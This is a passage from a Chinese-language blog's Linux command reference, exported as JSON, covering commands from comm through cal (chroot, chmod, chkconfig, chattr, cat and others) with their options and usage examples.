--zero-terminated 设置行终止符为NUL（空），而不是换行符。 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 返回值 返回 0 表示成功，返回非 0 值表示失败。 例子 文本aaa.txt内容 [root@localhost text]# cat aaa.txt aaa bbb ccc ddd eee 111 222 文本bbb.txt内容 [root@localhost text]# cat bbb.txt bbb ccc aaa hhh ttt jjj 比较结果 [root@localhost text]# comm --nocheck-order aaa.txt bbb.txt aaa bbb ccc aaa ddd eee 111 222 hhh ttt jjj 输出的第一列只包含在 aaa.txt 中出现的行，第二列包含在 bbb.txt 中出现的行，第三列包含在 aaa.txt 和 bbb.txt 中相同的行。各列之间以制表符（\\t）作为分隔符。 比较排序过的文档 先通过 sort 将文件内容排序： [root@localhost ~]# sort aaa.txt &gt; aaa1.txt [root@localhost ~]# sort bbb.txt &gt; bbb1.txt 比较结果： [root@localhost ~]# comm aaa1.txt bbb1.txt 111 222 aaa bbb ccc ddd eee hhh jjj ttt 交集 打印两个文件的交集，需要删除第一列和第二列： [root@localhost text]# comm aaa.txt bbb.txt -1 -2 bbb ccc 差集 通过删除不需要的列，可以得到 aaa.txt 和 bbb.txt 的差集： aaa.txt 的差集 [root@localhost text]# comm aaa.txt bbb.txt -2 -3 aaa ddd eee 111 222 bbb.txt 的差集 [root@localhost text]# comm aaa.txt bbb.txt -1 -3 aaa hhh ttt jjj 注意 该命令是 GNU coreutils 包中的命令，相关的帮助信息请查看man -s 1 comm，info coreutils 'comm invocation'。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"comm","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/comm/","stats":{"text":"3 min read","time":140000,"words":545,"minutes":3},"date":"2022-01-31 15:36:26","dateFormat":"2022-01-31"},{"content":"删除文件中的指定列。 补充说明 colrm 命令用于删除文件中的指定列。colrm 命令从标准输入设备读取书记，转而输出到标准输出设备。如果不加任何参数，则 colrm 命令不会过滤任何一行。 语法 colrm (参数) 参数 起始列号：指定要删除的指定列； 结尾列号：指定要删除的结尾列。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"colrm","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/colrm/","stats":{"text":"1 min read","time":21000,"words":105,"minutes":1},"date":"2022-01-31 15:07:41","dateFormat":"2022-01-31"},{"content":"过滤控制字符。 补充说明 col 命令是一个标准输入文本过滤器，它从标注输入设备读取文本内容，并把内容显示到标注输出设备。在许多 UNIX 说明文件里，都有 RLF 控制字符。当我们运用 shell 特殊字符&gt;和&gt;&gt;，把说明文件的内容输出成纯文本文件时，控制字符会变成乱码，col 命令则能有效滤除这些控制字符。 语法 col (选项) 选项 -b：过滤掉所有的控制字符，包括RLF和HRLF； -f：滤掉RLF字符，但允许将HRLF字符呈现出来； -x：以多个空格字符来表示跳格字符； -l&lt;缓冲区列数&gt;：预设的内存缓冲区有128列，用户可以自行指定缓冲区的大小。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"col","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/col/","stats":{"text":"1 min read","time":45000,"words":210,"minutes":1},"date":"2022-01-31 15:06:32","dateFormat":"2022-01-31"},{"content":"检测两台 linux 主机的时间差。 补充说明 在 ip 报文的首部和 ICMP 报文的首部都可以放入时间戳数据。 clockdiff 程序正是使用时间戳来测算目的主机和本地主机的系统时间差。 选项 -o：使用IP时间戳选项来测量系统时间差。时间戳只用3个。 -o1：使用IP时间戳选项来测量系统时间差。用4个时间戳。如果-o和-o1都没有设置，那么就是用ICMP时间戳来测试系统时间差。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"clockdiff","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/clockdiff/","stats":{"text":"1 min read","time":30000,"words":143,"minutes":1},"date":"2022-01-31 14:03:53","dateFormat":"2022-01-31"},{"content":"用于调整 RTC 时间。 补充说明 clock 命令用于调整 RTC 时间。 RTC 是电脑内建的硬件时间，执行这项指令可以显示现在时刻，调整硬件时钟的时间，将系统时间设成与硬件时钟之时间一致，或是把系统时间回存到硬件时钟。 语法 clock [--adjust][--debug][--directisa][--getepoch][--hctosys][--set --date=&quot;&lt;日期时间&gt;&quot;] [--setepoch --epoch=&lt; &gt;][--show][--systohc][--test][--utc][--version] 选项 --adjust 第一次使用&quot;--set&quot;或&quot;--systohc&quot;参数设置硬件时钟，会在/etc目录下产生一个名称为adjtime的文件。当再次使用这两个参数调整硬件时钟，此文件便会记录两次调整间之差异，日后执行clock指令加上&quot;--adjust&quot;参数时，程序会自动根 据记录文件的数值差异，计算出平均值，自动调整硬件时钟的时间。 --debug 详细显示指令执行过程，便于排错或了解程序执行的情形。 --directisa 告诉clock指令不要通过/dev/rtc设备文件，直接对硬件时钟进行存取。这个参数适用于仅有ISA总线结构的老式电脑。 --getepoch 把系统核心内的硬件时钟新时代数值，呈现到标准输出设备。 --hctosys Hardware Clock to System Time，把系统时间设成和硬件时钟一致。由于这个动作将会造成系统全面更新文件的存取时间，所以最好在系统启动时就执行它。 --set--date 设置硬件时钟的日期和时间。 --setepoch--epoch=&lt;年份&gt; 设置系统核心之硬件时钟的新时代数值，年份以四位树字表示。 --show 读取硬件时钟的时间，并将其呈现至标准输出设备。 --systohc System Time to Hardware Clock，将系统时间存回硬件时钟内。 --test 仅作测试，并不真的将时间写入硬件时钟或系统时间。 --utc 把硬件时钟上的时间时为CUT，有时也称为UTC或UCT。 --version 显示版本信息。 实例 获取当前的时间 clock # 获取当前的时间 显示UTC时间 clock -utc #显示UTC时间 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"clock","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/clock/","stats":{"text":"3 min read","time":122000,"words":550,"minutes":3},"date":"2022-01-31 14:01:13","dateFormat":"2022-01-31"},{"content":"清除当前屏幕终端上的任何信息。 补充说明 clear 命令用于清除当前屏幕终端上的任何信息。 语法 clear 实例 直接输入 clear 命令当前终端上的任何信息就可被清除。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"clear","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/clear/","stats":{"text":"1 min read","time":13000,"words":64,"minutes":1},"date":"2022-01-31 07:57:33","dateFormat":"2022-01-31"},{"content":"用来更换登录系统时使用的 shell。 补充说明 chsh 命令用来更换登录系统时使用的 shell。若不指定任何参数与用户名称，则 chsh 会以应答的方式进行设置。 语法 chsh(选项)(参数) ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"chsh","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/chsh/","stats":{"text":"1 min read","time":14000,"words":66,"minutes":1},"date":"2022-01-31 07:50:02","dateFormat":"2022-01-31"},{"content":"把根目录换成指定的目的目录。 补充说明 chroot 命令用来在指定的根目录下运行指令。chroot，即 change root directory （更改 root 目录）。在 linux 系统中，系统默认的目录结构都是以/，即是以根 (root) 开始的。而在使用 chroot 之后，系统的目录结构将以指定的位置作为/位置。 在经过 chroot 命令之后，系统读取到的目录和文件将不在是旧系统根下的而是新根下（即被指定的新的位置）的目录结构和文件，因此它带来的好处大致有以下 3 个： 增加了系统的安全性，限制了用户的权力： 在经过 chroot 之后，在新根下将访问不到旧系统的根目录结构和文件，这样就增强了系统的安全性。这个一般是在登录 (login) 前使用 chroot，以此达到用户不能访问一些特定的文件。 建立一个与原系统隔离的系统目录结构，方便用户的开发： 使用 chroot 后，系统读取的是新根下的目录和文件，这是一个与原系统根下文件不相关的目录结构。在这个新的环境中，可以用来测试软件的静态编译以及一些与系统不相关的独立开发。 切换系统的根目录位置，引导 Linux 系统启动以及急救系统等： chroot 的作用就是切换系统的根位置，而这个作用最为明显的是在系统初始引导磁盘的处理过程中使用，从初始 RAM 磁盘 (initrd) 切换系统的根位置并执行真正的 init。另外，当系统出现一些问题时，我们也可以使用 chroot 来切换到一个临时的系统。 语法 chroot (选项) (参数) 选项 --help：在线帮助； --version：显示版本信息。 参数 目录：指定新的根目录； 指令：指定要执行的指令。 实例 将 target 作为根目录（运行其中的/bin/sh）: chroot target /bin/sh 这里的 target 是 busybox 安装好的路径，类似一个文件系统包含了许多工具。这样，将会进入一个 shell 界面，这个 shell 以 target 为根。运行 exit 退出该 shell 又返回原来的本机环境了，也可以使用 Ctrl + D。 注意： 根用户才行 如果直接 chroot target 默认寻找 target 的 /bin/bash。这会以 target 作为根目录 将 target 作为根目录(运行其中的/bin/ls): chroot target /bin/ls 这里，target 是 busybox 安装好的路径，类似一个文件系统包含了许多工具。这样运行的是 target 中的 ls（不是本机的/bin/ls），然后返回立即本机的目录环境。 注意，自己在本地编译一个程序生成 a.out 之后，拷进target/bin/中这样运行却不行,因为它包含了动态连接的库，需要用 ldd 查看 a.out 需要那些动态库，将这些库拷贝到新根的对应路径下才能执行。 用 chroot 运行自己编译的一个程序： 准备 chroot 的根目录： mkdir newRoot 编译自己的程序： gcc main.c 这里 main.c 生成 a.out，功能是输出 hello。 查看程序需要的库： ldd a.out 输入之后，输出如下： linux-gate.so.1 = &amp;gt; (0xb8034000) libc.so.6 = &amp;gt; /lib/tls/i686/cmov/libc.so.6 (0xb7eab000) /lib/ld-linux.so.2 (0xb801a000) 将程序需要的库和程序拷贝到新根目录下： cp a.out newRoot mkdir newRoot/lib cp /lib/tls/i686/cmov/libc.so.6 newRoot/lib cp /lib/ld-linux.so.2 newRoot/lib 这里 newRoot 内容将如下： a.out lib/ 使用 chroot 运行自己的程序： su chroot newRoot /a.out 这样就能够正确运行 a.out 了，因为 a.out 使用到了其他的动态连接库，所以需要将库拷贝到 newRoot 中，如果没有其他库那么直接拷贝 a.out 就能运行。例如静态编译后的 busybox，其安装目录中的/bin/busybox就没有依赖其他库。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"chroot","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/chroot/","stats":{"text":"4 min read","time":230000,"words":1021,"minutes":4},"date":"2022-01-31 07:42:58","dateFormat":"2022-01-31"},{"content":"批量更新用户口令的工具。 补充说明 chpasswd 命令是批量更新用户口令的工具，是把一个文件内容重新定向添加到/etc/shadow中。 语法 chpasswd (选项) 选项 -e：输入的密码是加密后的密文； -h：显示帮助信息并退出； -m：当被支持的密码未被加密时，使用MD5加密代替DES加密。 实例 先创建用户密码对应文件，格式为username:password，如abc:abc123，必须以这种格式来书写，并且不能有空行，保存成文本文件 user.txt，然后执行 chpasswd 命令： chpasswd &lt; user.txt 以上是运用 chpasswd 命令来批量修改密码。是 linux 系统管理中的捷径。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"chpasswd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/chpasswd/","stats":{"text":"1 min read","time":40000,"words":183,"minutes":1},"date":"2022-01-31 07:41:26","dateFormat":"2022-01-31"},{"content":"用来变更文件或目录的权限。 概要 chmod [OPTION]... MODE[,MODE]... FILE... chmod [OPTION]... OCTAL-MODE FILE... chmod [OPTION]... --reference=RFILE FILE... 主要用途 通过符号组合的方式更改目标文件或目录的权限。 通过八进制数的方式更改目标文件或目录的权限。 通过参考文件的权限来更改目标文件或目录的权限。 参数 mode：八进制数或符号组合。 file：指定要更改权限的一到多个文件。 选项 -c, --changes：当文件的权限更改时输出操作信息。 --no-preserve-root：不将'/'特殊化处理，默认选项。 --preserve-root：不能在根目录下递归操作。 -f, --silent, --quiet：抑制多数错误消息的输出。 -v, --verbose：无论文件是否更改了权限，一律输出操作信息。 --reference=RFILE：使用参考文件或参考目录RFILE的权限来设置目标文件或目录的权限。 -R, --recursive：对目录以及目录下的文件递归执行更改权限操作。 --help：显示帮助信息并退出。 --version：显示版本信息并退出。 返回值 返回状态为成功除非给出了非法选项或非法参数。 例子 参考man chmod文档的DESCRIPTION段落得知： u符号代表当前用户。 g符号代表和当前用户在同一个组的用户，以下简称组用户。 o符号代表其他用户。 a符号代表所有用户。 r符号代表读权限以及八进制数4。 w符号代表写权限以及八进制数2。 x符号代表执行权限以及八进制数1。 X符号代表如果目标文件是可执行文件或目录，可给其设置可执行权限。 s符号代表设置权限 suid 和 sgid，使用权限组合u+s设定文件的用户的ID位，g+s设置组用户ID位。 t符号代表只有目录或文件的所有者才可以删除目录下的文件。 +符号代表添加目标用户相应的权限。 -符号代表删除目标用户相应的权限。 =符号代表添加目标用户相应的权限，删除未提到的权限。 linux文件的用户权限说明： # 查看当前目录（包含隐藏文件）的长格式。 ls -la -rw-r--r-- 1 user staff 651 Oct 12 12:53 .gitmodules # 第1位如果是d则代表目录，是-则代表普通文件。 # 更多详情请参阅info coreutils 'ls invocation'（ls命令的info文档）的'-l'选项部分。 # 第2到4位代表当前用户的权限。 # 第5到7位代表组用户的权限。 # 第8到10位代表其他用户的权限。 # 添加组用户的写权限。 chmod g+w ./test.log # 删除其他用户的所有权限。 chmod o= ./test.log # 使得所有用户都没有写权限。 chmod a-w ./test.log # 当前用户具有所有权限，组用户有读写权限，其他用户只有读权限。 chmod u=rwx, g=rw, o=r ./test.log # 等价的八进制数表示： chmod 754 ./test.log # 将目录以及目录下的文件都设置为所有用户拥有读写权限。 # 注意，使用'-R'选项一定要保留当前用户的执行和读取权限，否则会报错！ chmod -R a=rw ./testdir/ # 根据其他文件的权限设置文件权限。 chmod --reference=./1.log ./test.log 注意 该命令是 GNU coreutils 包中的命令，相关的帮助信息请查看man chmod或info coreutils 'chmod invocation'。 符号连接的权限无法变更，如果用户对符号连接修改权限，其改变会作用在被连接的原始文件。 使用 -R 选项一定要保留当前用户的执行和读取权限，否则会报错！ ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"chmod","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/chmod/","stats":{"text":"4 min read","time":211000,"words":947,"minutes":4},"date":"2022-01-31 07:33:20","dateFormat":"2022-01-31"},{"content":"检查或设置系统的各种服务。 补充说明 chkconfig 命令检查、设置系统的各种服务。这是 Red Hat 公司遵循 GPL 规则所开发的程序，它可查询操作系统在每一个执行等级中会执行哪些系统服务，其中包括各类常驻服务。谨记 chkconfig 不是立即自动禁止或激活一个服务，它只是简单的改变了符号连接。 语法 chkconfig (选项) 选项 --add：增加所指定的系统服务，让chkconfig指令得以管理它，并同时在系统启动的叙述文件内增加相关数据； --del：删除所指定的系统服务，不再由chkconfig指令管理，并同时在系统启动的叙述文件内删除相关数据； --level&lt;等级代号&gt;：指定读系统服务要在哪一个执行等级中开启或关毕。 缺省的运行级，RHS用到的级别如下： 0：关机 1：单用户模式 2：无网络支持的多用户模式 3：有网络支持的多用户模式 4：保留，未使用 5：有网络支持有X-Window支持的多用户模式 6：重新引导系统，即重启 对各个运行级的详细解释： 0 为停机，机器关闭。 1 为单用户模式，就像Win9x下的安全模式类似。 2 为多用户模式，但是没有NFS支持。 3 为完整的多用户模式，是标准的运行级。 4 一般不用，在一些特殊情况下可以用它来做一些事情。例如在笔记本 电脑的电池用尽时，可以切换到这个模式来做一些设置。 5 就是X11，进到X Window系统了。 6 为重启，运行init 6机器就会重启。 需要说明的是，level 选项可以指定要查看的运行级而不一定是当前运行级。对于每个运行级，只能有一个启动脚本或者停止脚本。当切换运行级时，init 不会重新启动已经启动的服务，也不会再次去停止已经停止的服务。 运行级文件： 每个被 chkconfig 管理的服务需要在对应的 init.d 下的脚本加上两行或者更多行的注释。第一行告诉 chkconfig 缺省启动的运行级以及启动和停止的优先级。如果某服务缺省不在任何运行级启动，那么使用-代替运行级。第二行对服务进行描述，可以用\\跨行注释。 例如 random.init 包含三行： # chkconfig: 2345 20 80 # description: Saves and restores system entropy pool for \\ # higher quality random number generation. 实例 chkconfig --list #列出所有的系统服务。 chkconfig --add httpd #增加httpd服务。 chkconfig --del httpd #删除httpd服务。 chkconfig --level httpd 2345 on #设置httpd在运行级别为2、3、4、5的情况下都是on（开启）的状态。 chkconfig --list # 列出系统所有的服务启动情况。 chkconfig --list mysqld # 列出mysqld服务设置情况。 chkconfig --level 35 mysqld on # 设定mysqld在等级3和5为开机运行服务，--level 35表示操作只在等级3和5执行，on表示启动，off表示关闭。 chkconfig mysqld on # 设定mysqld在各等级为on，“各等级”包括2、3、4、5等级。 chkconfig –level redis 2345 on # 把redis在运行级别为2、3、4、5的情况下都是on（开启）的状态。 如何增加一个服务： 服务脚本必须存放在/etc/ini.d/目录下； chkconfig --add servicename在 chkconfig 工具服务列表中增加此服务，此时服务会被在/etc/rc.d/rcN.d中赋予 K/S 入口了； chkconfig --level 35 mysqld on修改服务的默认启动等级。 ","tags":[],"title":"chkconfig","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/chkconfig/","stats":{"text":"4 min read","time":207000,"words":923,"minutes":4},"date":"2022-01-31 07:26:13","dateFormat":"2022-01-31"},{"content":"用来改变 finger 命令显示的信息。 补充说明 chfn 命令用来改变 finger 命令显示的信息。这些信息都存放在 /etc 目录里的 passwd 文件里。若不指定任何选项，则 chfn 命令会进入问答式界面。 语法 chfn (选项) (参数) 选项 -f&lt;真实姓名&gt;或--full-name&lt;真实姓名&gt;：设置真实姓名； -h&lt;家中电话&gt;或--home-phone&lt;家中电话&gt;：设置家中的电话号码； -o&lt;办公地址&gt;或--office&lt;办公地址&gt;：设置办公室的地址； -p&lt;办公电话&gt;或--office-phone&lt;办公电话&gt;：设置办公室的电话号码； -u或--help：在线帮助； -v或-version：显示版本信息。 参数 用户名：指定要改变 finger 信息的用户名。 实例 范例 1，改变 finger 信息： [root@localhost Desktop]# chfn Changing finger information for root. Name [root]: jack Office []: hn Office Phone []: 888888 Home Phone []: 9999999 Finger information changed. 范例 2，改变账号真实姓名： [root@localhost Desktop]# chfn -f jack Changing finger information for root. Finger information changed. 范例3： shell&gt;&gt; chfn Changing finger information for user Password: [del] Name[]:linuxde ### 提供 finger 时的资料 Office[]:NCCU Office Phone[]: [del] Home Phone[]: [del] ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"chfn","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/chfn/","stats":{"text":"2 min read","time":76000,"words":295,"minutes":2},"date":"2022-01-31 07:21:00","dateFormat":"2022-01-31"},{"content":"修改对象（文件）的安全上下文。 补充说明 chcon 命令是修改对象（文件）的安全上下文，比如：用户、角色、类型、安全级别。也就是将每个文件的安全环境变更至指定环境。使用--reference选项时，把指定文件的安全环境设置为与参考文件相同。chcon 命令位于/usr/bin/chcon。 语法 chcon [选项]... 环境 文件... chcon [选项]... [-u 用户] [-r 角色] [-l 范围] [-t 类型] 文件... chcon [选项]... --reference=参考文件 文件... 选项 -h, --no-dereference：影响符号连接而非引用的文件。 --reference=参考文件：使用指定参考文件的安全环境，而非指定值。 -R, --recursive：递归处理所有的文件及子目录。 -v, --verbose：为处理的所有文件显示诊断信息。 -u, --user=用户：设置指定用户的目标安全环境。 -r, --role=角色：设置指定角色的目标安全环境。 -t, --type=类型：设置指定类型的目标安全环境。 -l, --range=范围：设置指定范围的目标安全环境。 以下选项是在指定了-R选项时被用于设置如何穿越目录结构体系。如果您指定了多于一个选项，那么只有最后一个会生效。 -H：如果命令行参数是一个通到目录的符号链接，则遍历符号链接。 -L：遍历每一个遇到的通到目录的符号链接。 -P：不遍历任何符号链接（默认）。 --help：显示此帮助信息并退出。 --version：显示版本信息并退出。 实例 如果你想把这个 ftp 共享给匿名用户的话，需要开启以下： chcon -R -t public_content_t /var/ftp 如果你想让你设置的 FTP 目录可以上传文件的话，SELINUX 需要设置： chcon -t public_content_rw_t /var/ftp/incoming 允许用户 HHTP 访问其家目录，该设定限仅于用户的家目录主页： setsebool -P httpd_enable_homedirs 1 chcon -R -t httpd_sys_content_t ~user/public_html 如果你希望将 samba 目录共享给其他用户，你需要设置： chcon -t samba_share_t /directory 共享 rsync 目录时： chcon -t public_content_t /directories ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"chcon","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/chcon/","stats":{"text":"2 min read","time":119000,"words":535,"minutes":2},"date":"2022-01-31 07:17:41","dateFormat":"2022-01-31"},{"content":"用来改变文件属性。 补充说明 chattr 命令用来改变文件属性。这项指令可改变存放在 ext2 文件系统上的文件或目录属性，这些属性共有以下 8 种模式： 语法 chattr (选项) 选项 a：让文件或目录仅供附加用途； b：不更新文件或目录的最后存取时间； c：将文件或目录压缩后存放； d：将文件或目录排除在倾倒操作之外； i：不得任意更动文件或目录； s：保密性删除文件或目录； S：即时更新文件或目录； u：预防意外删除。 -R：递归处理，将指令目录下的所有文件及子目录一并处理； -v&lt;版本编号&gt;：设置文件或目录版本； -V：显示指令执行过程； +&lt;属性&gt;：开启文件或目录的该项属性； -&lt;属性&gt;：关闭文件或目录的该项属性； =&lt;属性&gt;：指定文件或目录的该项属性。 实例 用 chattr 命令防止系统中某个关键文件被修改： chattr +i /etc/fstab 然后试一下rm、mv、rename 等命令操作于该文件，都是得到 Operation not permitted 的结果。 让某个文件只能往里面追加内容，不能删除，一些日志文件适用于这种操作： chattr +a /data1/user_act.log ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"chattr","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/chattr/","stats":{"text":"2 min read","time":76000,"words":347,"minutes":2},"date":"2022-01-31 07:16:16","dateFormat":"2022-01-31"},{"content":"Linux 系统下光盘刻录功能命令。 补充说明 cdrecord 命令用于 Linux 系统下光盘刻录，它支持 cd 和 DVD 格式。linux 下一般都带有 cdrecord 软件。 语法 cdrecord (选项) (参数) 选项 -v：显示刻录光盘的详细过程； -eject：刻录完成后弹出光盘； speed=&lt;刻录倍速&gt;：指定光盘刻录的倍速； dev=&lt;刻录机设备号&gt;：指定使用“-scanbus”参数扫描到的刻录机的设备号； -scanbus：扫描系统中可用的刻录机。 参数 ISO文件：指定刻录光盘使用的ISO映像文件。 实例 查看系统所有 CD-R(w) 设备： cdrecord -scanbus scsibus0: 0,0,0 0) * 0,1,0 1) * 0,2,0 2) * 0,3,0 3) 'HP ' 'CD-Writer+ 9200 ' '1.0c' Removable CD-ROM 用 iso 文件刻录一张光盘： cdrecord -v -eject speed=4 dev=0,3,0 backup.iso 参数解释 -v：显示刻录光盘的详细过程 -eject：刻完自动弹出光盘 speed=4 dev=0,3,0：四速刻录到HP CD-writer设备上。 擦写光驱： cdrecord --dev=0,3,0 --blank=fast ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"cdrecord","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/cdrecord/","stats":{"text":"2 min read","time":67000,"words":267,"minutes":2},"date":"2022-01-31 07:10:06","dateFormat":"2022-01-31"},{"content":"切换用户当前工作目录。 概要 cd [-L|[-P [-e]]] [dir] 主要用途 切换工作目录至dir。其中dir的表示法可以是绝对路径或相对路径。 若参数dir省略，则默认为使用者的 shell 变量HOME。 如果dir指定为~时表示为使用者的 shell 变量HOME，.表示当前目录，..表示当前目录的上一级目录。 环境变量CDPATH是由冒号分割的一到多个目录，你可以将常去的目录的上一级加入到CDPATH以便方便访问它们；如果dir以/开头那么CDPATH不会被使用。 当shopt选项cdable_vars打开时，如果dir在CDPATH及当前目录下均不存在，那么会把它当作变量，读取它的值作为要进入的目录。 参数 dir（可选）：指定要切换到的目录。 选项 -L （默认值）如果要切换到的目标目录是一个符号连接，那么切换到符号连接的目录。 -P 如果要切换到的目标目录是一个符号连接，那么切换到它指向的物理位置目录。 - 当前工作目录将被切换到环境变量OLDPWD所表示的目录，也就是前一个工作目录。 返回值 返回状态为成功除非无法进入指定的目录。 例子 cd # 进入用户主目录； cd / # 进入根目录 cd ~ # 进入用户主目录； cd .. # 返回上级目录（若当前目录为“/“，则执行完后还在“/&quot;；&quot;..&quot;为上级目录的意思）； cd ../.. # 返回上两级目录； cd !$ # 把上个命令的参数作为cd参数使用。 关于切换到上一个工作目录的说明 cd - # 命令会首先显示要切换到的目标目录，然后再进入。 cd ${OLDPWD} # 命令会直接切换到上一个工作目录。 关于CDPATH # 设置桌面文件夹作为CDPATH的值。 CDPATH='~/Desktop' # 假设我们接下来要演示涉及到的路径~和~/Desktop下没有test3文件夹，现在新建它们。 mkdir ~/test3 mkdir ~/Desktop/test3 # 进入~目录。 cd ~ # 进入test3目录。 cd test3 # 执行后显示~/Desktop/test3并进入该目录，而不是~目录的test3目录。 # 如果CDPATH存在值，那么优先在CDPATH中查找并进入第一个匹配成功的，如果全部失败那么最后尝试当前目录。 关于cdable_vars # 打开选项。 shopt -s cdable_vars # 假设当前路径以及CDPATH没有名为new_var的目录。 new_var='~/Desktop' # 尝试进入。 cd new_var # 关闭选项。 shopt -u cdable_vars 注意 该命令是 bash 内建命令，相关的帮助信息请查看 help 命令。 建议您在编写脚本的过程中如有必要使用 cd 命令时，请增加必要的注释以用于提醒阅读者当前工作目录，以免出现诸如找不到文件这类问题的发生。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"cd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/cd/","stats":{"text":"3 min read","time":157000,"words":727,"minutes":3},"date":"2022-01-31 07:05:26","dateFormat":"2022-01-31"},{"content":"连接多个文件并打印到标准输出。 概要 cat [OPTION]... [FILE]... 主要用途 显示文件内容，如果没有文件或文件为-则读取标准输入。 将多个文件的内容进行连接并打印到标准输出。 显示文件内容中的不可见字符（控制字符、换行符、制表符等）。 参数 FILE（可选）：要处理的文件，可以为一或多个。 选项 长选项与短选项等价 -A, --show-all 等价于&quot;-vET&quot;组合选项。 -b, --number-nonblank 只对非空行编号，从1开始编号，覆盖&quot;-n&quot;选项。 -e 等价于&quot;-vE&quot;组合选项。 -E, --show-ends 在每行的结尾显示'$'字符。 -n, --number 对所有行编号，从1开始编号。 -s, --squeeze-blank 压缩连续的空行到一行。 -t 等价于&quot;-vT&quot;组合选项。 -T, --show-tabs 使用&quot;^I&quot;表示TAB（制表符）。 -u POSIX兼容性选项，无意义。 -v, --show-nonprinting 使用&quot;^&quot;和&quot;M-&quot;符号显示控制字符，除了LFD（line feed，即换行符'\\n'）和TAB（制表符）。 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 返回值 返回状态为成功除非给出了非法选项或非法参数。 例子 # 合并显示多个文件 cat ./1.log ./2.log ./3.log # 显示文件中的非打印字符、tab、换行符 cat -A test.log # 压缩文件的空行 cat -s test.log # 显示文件并在所有行开头附加行号 cat -n test.log # 显示文件并在所有非空行开头附加行号 cat -b test.log # 将标准输入的内容和文件内容一并显示 echo '######' |cat - test.log 注意 该命令是 GNU coreutils 包中的命令，相关的帮助信息请查看man -s 1 cat或info coreutils 'cat invocation'。 当使用cat命令查看体积较大的文件时，文本在屏幕上迅速闪过（滚屏），用户往往看不清所显示的内容，为了控制滚屏，可以按 Ctrl + S 键停止滚屏；按 Ctrl + Q 键恢复滚屏；按 Ctrl + C（中断）键可以终止该命令的执行，返回 Shell 提示符状态。 建议您查看体积较大的文件时使用less、more命令或emacs、vi等文本编辑器。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"cat","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/cat/","stats":{"text":"3 min read","time":133000,"words":574,"minutes":3},"date":"2022-01-31 07:02:19","dateFormat":"2022-01-31"},{"content":"取消已存在的打印任务。 补充说明 cancel 命令用于取消已存在的打印任务。 语法 cancel (选项) (参数) 选项 -a：取消所有打印任务； -E：当连接到服务器时强制使用加密； -U：指定连接服务器时使用的用户名； -u：指定打印任务所属的用户； -h：指定连接的服务器名和端口号。 参数 打印任务号：指定要取消的打印任务编号。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"cancel","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/cancel/","stats":{"text":"1 min read","time":25000,"words":122,"minutes":1},"date":"2022-01-31 07:01:23","dateFormat":"2022-01-31"},{"content":"显示当前日历或指定日期的日历。 补充说明 cal 命令用于显示当前日历，或者指定日期的日历，如果没有指定参数，则显示当前月份。 一个单一的参数指定要显示的年份 (1 - 9999) ; 注意年份必须被完全地指定: cal 89 不会 显示 1989 年的日历. 两个参数表示月份 (1 - 12) 和年份。如果没有指定参数, 则显示当前月份的日历。 一年从 Jan 1 (1 月 1 日) 开始。 格里高利历法改革（Gregorian Reformation）被认为发生于 1752 年 9 月 3 日。在此之前, 多数国家已经认可这项改革（尽管有一些直到 20 